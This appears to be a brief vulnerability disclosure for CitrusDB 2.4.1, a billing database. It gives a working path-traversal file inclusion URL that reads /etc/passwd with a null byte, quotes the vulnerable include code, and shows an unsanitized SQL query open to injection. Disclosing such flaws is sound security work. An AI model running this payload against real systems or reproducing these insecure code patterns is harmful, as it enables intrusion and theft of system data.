CitrusDB is an open source customer service and billing database.
It can be used by customer service personnel to provide sales and support to customers, 
and by billing staff to bill customers for their services via invoices and credit card batches. 
Customers may access the Online customer account manager to view their services, billing history,
and make service and support requests online.

1) LFI
http://192.168.51.8/lab/citrus-2.4.1/index.php?load=../../../../../etc/passwd%00&type=base

index.php:315

    $filepath = "$path_to_citrus/$load.php";
                if (file_exists($filepath)) {
                        include('./'.$load.'.php');


2) SQL INJECTION

include/user.class.php:134

$sql="SELECT password FROM user WHERE username='$user_name' LIMIT 1";
